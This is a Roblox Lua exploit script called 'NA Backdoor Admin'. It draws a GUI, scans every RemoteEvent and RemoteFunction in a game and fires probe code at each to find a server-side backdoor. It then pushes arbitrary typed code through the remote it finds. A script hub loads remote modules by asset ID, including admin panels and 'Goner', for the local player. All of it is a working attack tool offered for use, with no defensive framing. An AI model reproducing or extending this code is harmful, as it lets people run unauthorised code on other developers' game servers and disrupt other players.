local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Cody = Instance.new("TextBox")
local Execy = Instance.new("TextButton")
local Clear = Instance.new("TextButton")
local Acqur = Instance.new("TextButton")
local ScriptHubButton = Instance.new("TextButton")
local ScriptHubFrame = Instance.new("Frame")
local ScriptHubTitle = Instance.new("TextLabel")
local ButtonsContainer = Instance.new("Frame")

local PolariaBtn = Instance.new("TextButton")
local HDAdminBtn = Instance.new("TextButton")
local SugmaBtn = Instance.new("TextButton")
local GonerBtn = Instance.new("TextButton")
local GunBtn = Instance.new("TextButton")
local NachosBtn = Instance.new("TextButton")
local ServerAdminBtn = Instance.new("TextButton")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(255, 255, 0)
Frame.Position = UDim2.new(0.313121259, 0, 0.341346145, 0)
Frame.Size = UDim2.new(0, 455, 0, 223)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(0, 455, 0, 47)
TextLabel.Font = Enum.Font.Highway
TextLabel.Text = "NA Backdoor Admin"
TextLabel.TextColor3 = Color3.fromRGB(233, 255, 39)
TextLabel.TextSize = 20.000

Cody.Name = "Cody"
Cody.Parent = Frame
Cody.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Cody.BorderColor3 = Color3.fromRGB(242, 255, 0)
Cody.BorderSizePixel = 0
Cody.Position = UDim2.new(0.045706477, 0, 0.192825109, 0)
Cody.Size = UDim2.new(0, 413, 0, 111)
Cody.Font = Enum.Font.Highway
Cody.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
Cody.Text = "-- NA Backdoor Admin by Yaazkidd! Thank you for using."
Cody.PlaceholderText = " "
Cody.ClearTextOnFocus = false
Cody.TextColor3 = Color3.fromRGB(0, 0, 0)
Cody.TextSize = 20.000
Cody.TextWrapped = true

Execy.Name = "Execy"
Execy.Parent = Frame
Execy.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Execy.BorderColor3 = Color3.fromRGB(255, 247, 0)
Execy.Position = UDim2.new(0.047904212, 0, 0.739910305, 0)
Execy.Size = UDim2.new(0, 126, 0, 50)
Execy.Font = Enum.Font.Highway
Execy.Text = "Execute"
Execy.TextColor3 = Color3.fromRGB(255, 247, 0)
Execy.TextSize = 20.000

Clear.Name = "Clear"
Clear.Parent = Frame
Clear.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Clear.BorderColor3 = Color3.fromRGB(251, 255, 8)
Clear.Position = UDim2.new(0.342409641, 0, 0.739910305, 0)
Clear.Size = UDim2.new(0, 143, 0, 50)
Clear.Font = Enum.Font.Highway
Clear.Text = "Clear"
Clear.TextColor3 = Color3.fromRGB(255, 255, 6)
Clear.TextSize = 20.000

Acqur.Name = "Acqur"
Acqur.Parent = Frame
Acqur.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Acqur.BorderColor3 = Color3.fromRGB(235, 255, 10)
Acqur.Position = UDim2.new(0.672527492, 0, 0.739910305, 0)
Acqur.Size = UDim2.new(0, 128, 0, 50)
Acqur.Font = Enum.Font.Highway
Acqur.Text = "Inject"
Acqur.TextColor3 = Color3.fromRGB(255, 255, 0)
Acqur.TextSize = 20.000

ScriptHubButton.Name = "ScriptHubButton"
ScriptHubButton.Parent = Frame
ScriptHubButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScriptHubButton.BorderColor3 = Color3.fromRGB(255, 255, 0)
ScriptHubButton.Position = UDim2.new(1.02, 0, 0, 0)
ScriptHubButton.Size = UDim2.new(0, 100, 0, 30)
ScriptHubButton.Font = Enum.Font.Highway
ScriptHubButton.Text = "ScriptHub"
ScriptHubButton.TextColor3 = Color3.fromRGB(255, 255, 0)
ScriptHubButton.TextSize = 14.000
ScriptHubButton.Visible = true

ScriptHubFrame.Name = "ScriptHubFrame"
ScriptHubFrame.Parent = ScreenGui
ScriptHubFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
ScriptHubFrame.BorderColor3 = Color3.fromRGB(255, 255, 0)
ScriptHubFrame.BorderSizePixel = 2
ScriptHubFrame.Position = UDim2.new(0.35, 0, 0.3, 0)
ScriptHubFrame.Size = UDim2.new(0, 300, 0, 250)
ScriptHubFrame.Visible = false
ScriptHubFrame.ClipsDescendants = true

ScriptHubTitle.Name = "ScriptHubTitle"
ScriptHubTitle.Parent = ScriptHubFrame
ScriptHubTitle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ScriptHubTitle.BorderSizePixel = 0
ScriptHubTitle.Size = UDim2.new(0, 300, 0, 30)
ScriptHubTitle.Font = Enum.Font.Highway
ScriptHubTitle.Text = "SCRIPT HUB"
ScriptHubTitle.TextColor3 = Color3.fromRGB(255, 255, 0)
ScriptHubTitle.TextSize = 18.000
ScriptHubTitle.TextStrokeTransparency = 0.8

local gradient = Instance.new("UIGradient")
gradient.Parent = ScriptHubTitle
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 200, 0))
}
gradient.Rotation = 90

ButtonsContainer.Name = "ButtonsContainer"
ButtonsContainer.Parent = ScriptHubFrame
ButtonsContainer.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
ButtonsContainer.BackgroundTransparency = 0.2
ButtonsContainer.BorderSizePixel = 0
ButtonsContainer.Position = UDim2.new(0.05, 0, 0.15, 0)
ButtonsContainer.Size = UDim2.new(0.9, 0, 0.8, 0)

local buttonSize = UDim2.new(0.3, 0, 0, 30)
local buttonPadding = 5

PolariaBtn.Name = "PolariaBtn"
PolariaBtn.Parent = ButtonsContainer
PolariaBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
PolariaBtn.BorderColor3 = Color3.fromRGB(255, 255, 0)
PolariaBtn.Position = UDim2.new(0, 0, 0, 0)
PolariaBtn.Size = buttonSize
PolariaBtn.Font = Enum.Font.Highway
PolariaBtn.Text = "Polaria"
PolariaBtn.TextColor3 = Color3.fromRGB(255, 255, 0)
PolariaBtn.TextSize = 12.000

HDAdminBtn.Name = "HDAdminBtn"
HDAdminBtn.Parent = ButtonsContainer
HDAdminBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
HDAdminBtn.BorderColor3 = Color3.fromRGB(255, 255, 0)
HDAdminBtn.Position = UDim2.new(0.33, 0, 0, 0)
HDAdminBtn.Size = buttonSize
HDAdminBtn.Font = Enum.Font.Highway
HDAdminBtn.Text = "HD Admin"
HDAdminBtn.TextColor3 = Color3.fromRGB(255, 255, 0)
HDAdminBtn.TextSize = 12.000

SugmaBtn.Name = "SugmaBtn"
SugmaBtn.Parent = ButtonsContainer
SugmaBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SugmaBtn.BorderColor3 = Color3.fromRGB(255, 255, 0)
SugmaBtn.Position = UDim2.new(0.66, 0, 0, 0)
SugmaBtn.Size = buttonSize
SugmaBtn.Font = Enum.Font.Highway
SugmaBtn.Text = "Sugma"
SugmaBtn.TextColor3 = Color3.fromRGB(255, 255, 0)
SugmaBtn.TextSize = 12.000

GonerBtn.Name = "GonerBtn"
GonerBtn.Parent = ButtonsContainer
GonerBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
GonerBtn.BorderColor3 = Color3.fromRGB(255, 255, 0)
GonerBtn.Position = UDim2.new(0, 0, 0.2, 0)
GonerBtn.Size = buttonSize
GonerBtn.Font = Enum.Font.Highway
GonerBtn.Text = "Goner"
GonerBtn.TextColor3 = Color3.fromRGB(255, 255, 0)
GonerBtn.TextSize = 12.000

GunBtn.Name = "GunBtn"
GunBtn.Parent = ButtonsContainer
GunBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
GunBtn.BorderColor3 = Color3.fromRGB(255, 255, 0)
GunBtn.Position = UDim2.new(0.33, 0, 0.2, 0)
GunBtn.Size = buttonSize
GunBtn.Font = Enum.Font.Highway
GunBtn.Text = "Gun"
GunBtn.TextColor3 = Color3.fromRGB(255, 255, 0)
GunBtn.TextSize = 12.000

NachosBtn.Name = "NachosBtn"
NachosBtn.Parent = ButtonsContainer
NachosBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
NachosBtn.BorderColor3 = Color3.fromRGB(255, 255, 0)
NachosBtn.Position = UDim2.new(0.66, 0, 0.2, 0)
NachosBtn.Size = buttonSize
NachosBtn.Font = Enum.Font.Highway
NachosBtn.Text = "Quitos"
NachosBtn.TextColor3 = Color3.fromRGB(255, 255, 0)
NachosBtn.TextSize = 12.000

ServerAdminBtn.Name = "ServerAdminBtn"
ServerAdminBtn.Parent = ButtonsContainer
ServerAdminBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ServerAdminBtn.BorderColor3 = Color3.fromRGB(255, 255, 0)
ServerAdminBtn.Position = UDim2.new(0, 0, 0.4, 0)
ServerAdminBtn.Size = buttonSize
ServerAdminBtn.Font = Enum.Font.Highway
ServerAdminBtn.Text = "Server Admin"
ServerAdminBtn.TextColor3 = Color3.fromRGB(255, 255, 0)
ServerAdminBtn.TextSize = 12.000

local function UZEBOG_fake_script()
    local script = Instance.new('LocalScript', Frame)

    script.Parent.Clear.MouseButton1Click:Connect(function()
        script.Parent.Cody.Text = ""
    end)
end
coroutine.wrap(UZEBOG_fake_script)()
local function JNGXQLQ_fake_script()
    local script = Instance.new('LocalScript', Frame)

    function dragify(Main)
        dragToggle = nil
        dragSpeed = 0.86
        dragInput = nil
        dragStart = nil
        dragPos = nil

        function updateInput(input)
            Delta = input.Position - dragStart
            Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
            game:GetService("TweenService"):Create(Main, TweenInfo.new(.25), {Position = Position}):Play()
        end

        Main.InputBegan:Connect(function(input)
            if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
                dragToggle = true
                dragStart = input.Position
                startPos = Main.Position
                input.Changed:Connect(function()
                    if (input.UserInputState == Enum.UserInputState.End) then
                        dragToggle = false
                    end
                end)
            end
        end)

        Main.InputChanged:Connect(function(input)
            if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                dragInput = input
            end
        end)

        game:GetService("UserInputService").InputChanged:Connect(function(input)
            if (input == dragInput and dragToggle) then
                updateInput(input)
            end
        end)
    end

    dragify(script.Parent)
end
coroutine.wrap(JNGXQLQ_fake_script)()

local AcquiredRemote = nil
local IsAcquiring = false

local function FZAXI_fake_script()
    local script = Instance.new('LocalScript', Frame)

    local Acqur = script.Parent:WaitForChild("Acqur")
    local Execy = script.Parent:WaitForChild("Execy")
    local Cody = script.Parent:WaitForChild("Cody")

    Acqur.MouseButton1Click:Connect(function()
        local RemoteList = {}
        local CurrentRemote = nil
        local isFound = false

        if not IsAcquiring then
            IsAcquiring = true
            local originalText = Acqur.Text
            Acqur.Text = "Scanning..."
            warn('NA Backdoor Admin // Scanning Started! Please wait..')
            Cody.Text = '-- NA Backdoor Admin is Scanning a backdoor game..'

            for _, v in pairs(game:GetDescendants()) do
                if v.Parent ~= game:GetService('RobloxReplicatedStorage') then
                    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                        table.insert(RemoteList, v)
                    end
                end
            end

            for _, b in pairs(RemoteList) do
                if AcquiredRemote == nil then
                    local NeededName = ""
                    for _ = 1, 64 do
                        NeededName = NeededName .. string.char(math.random(65, 90))
                    end
                    local NeededCode = 'Instance.new("Model", workspace).Name = "' .. NeededName .. '"'

                    CurrentRemote = b
                    if b:IsA("RemoteEvent") then
                        b:FireServer(NeededCode)
                    elseif b:IsA("RemoteFunction") then
                        task.spawn(function() pcall(function() b:InvokeServer(NeededCode) end) end)
                    end

                    wait(2.5)

                    local created = workspace:FindFirstChild(NeededName)
                    if created and created:IsA("Model") then
                        AcquiredRemote = b
                    end
                end
            end

            if AcquiredRemote then
                isFound = true
                Acqur.Text = "Injected"
                warn("NA Backdoor Admin // Founded Backdoor!")
                Cody.Text = "-- NA Backdoor // Founded Backdoor Remote! :)"
            else
                isFound = false
                Acqur.Text = originalText
                Cody.Text = "NA Backdoor Admin // Remote not founded.. :("
                warn("NA Backdoor Admin // No Backdoor no life :(")
            end

            IsAcquiring = false
        end
    end)

    Execy.MouseButton1Click:Connect(function()
        local originalText = Execy.Text
        Execy.Text = "Executed!"
        
        task.delay(2, function()
            Execy.Text = originalText
        end)

        local CodeStr = Cody.Text
        local InvokeFunc = Instance.new("BindableEvent")

        InvokeFunc.Event:Connect(function(rfunc, codestr2)
            task.spawn(function()
                pcall(function()
                    rfunc:InvokeServer(codestr2)
                end)
            end)
        end)

        local function DeepFire(inst)
            if not IsAcquiring then
                if AcquiredRemote == nil then
                    for _, childy in ipairs(inst:GetChildren()) do
                        if childy.Parent ~= game:GetService("RobloxReplicatedStorage") then
                            if childy:IsA("RemoteEvent") then
                                childy:FireServer(CodeStr)
                            elseif childy:IsA("RemoteFunction") then
                                InvokeFunc:Fire(childy, CodeStr)
                            end
                        end
                        DeepFire(childy)
                    end
                else
                    if AcquiredRemote:IsA("RemoteEvent") then
                        AcquiredRemote:FireServer(CodeStr)
                    elseif AcquiredRemote:IsA("RemoteFunction") then
                        task.spawn(function()
                            pcall(function()
                                AcquiredRemote:InvokeServer(CodeStr)
                            end)
                        end)
                    end
                end
            end
        end

        warn("NA Backdoor Admin // Using all remote..\n" .. CodeStr)
        DeepFire(game)
    end)
end
coroutine.wrap(FZAXI_fake_script)()

local function ScriptHubScript()
    local function makeDraggable(frame)
        local dragToggle = nil
        local dragSpeed = 0.25
        local dragInput = nil
        local dragStart = nil
        local dragPos = nil

        frame.InputBegan:Connect(function(input)
            if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
                dragToggle = true
                dragStart = input.Position
                startPos = frame.Position
                
                input.Changed:Connect(function()
                    if (input.UserInputState == Enum.UserInputState.End) then
                        dragToggle = false
                    end
                end)
            end
        end)

        frame.InputChanged:Connect(function(input)
            if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                dragInput = input
            end
        end)

        game:GetService("UserInputService").InputChanged:Connect(function(input)
            if (input == dragInput and dragToggle) then
                local delta = input.Position - dragStart
                frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)
    end
    
    makeDraggable(ScriptHubFrame)
    
    ScriptHubButton.MouseButton1Click:Connect(function()
        ScriptHubFrame.Visible = not ScriptHubFrame.Visible
    end)
    
    local function isInjected()
        return AcquiredRemote ~= nil
    end
    
    local function showInjectionWarning()
        warn("NA Backdoor Admin // Please inject first before using ScriptHub!")
        local originalText = Acqur.Text
        Acqur.Text = "Inject"
        task.delay(2, function()
            Acqur.Text = originalText
        end)
    end
    
    local function executeScript(scriptCode)
        if isInjected() then
            if AcquiredRemote:IsA("RemoteEvent") then
                AcquiredRemote:FireServer(scriptCode)
            elseif AcquiredRemote:IsA("RemoteFunction") then
                task.spawn(function()
                    pcall(function()
                        AcquiredRemote:InvokeServer(scriptCode)
                    end)
                end)
            end
        else
            showInjectionWarning()
        end
    end
    
    PolariaBtn.MouseButton1Click:Connect(function()
        local script = 'require(123255432303221):Pload("' .. game.Players.LocalPlayer.Name .. '")'
        executeScript(script)
    end)
    
    HDAdminBtn.MouseButton1Click:Connect(function()
        local script = 'require(7192763922).load("' .. game.Players.LocalPlayer.Name .. '")'
        executeScript(script)
    end)
    
    SugmaBtn.MouseButton1Click:Connect(function()
        local script = 'require(11183244198):s("sugma", "' .. game.Players.LocalPlayer.Name .. '")'
        executeScript(script)
    end)
    
    GonerBtn.MouseButton1Click:Connect(function()
        local script = 'require(4513235536).G("' .. game.Players.LocalPlayer.Name .. '")'
        executeScript(script)
    end)
    
    GunBtn.MouseButton1Click:Connect(function()
        local script = 'require(4207271766).load("' .. game.Players.LocalPlayer.Name .. '")'
        executeScript(script)
    end)
    
    NachosBtn.MouseButton1Click:Connect(function()
        local script = 'require(136199913883937):Pload("' .. game.Players.LocalPlayer.Name .. '")'
        executeScript(script)
    end)
    
    ServerAdminBtn.MouseButton1Click:Connect(function()
        local script = 'require(4665394711).load("' .. game.Players.LocalPlayer.Name .. '")'
        executeScript(script)
    end)
end

ScriptHubScript()
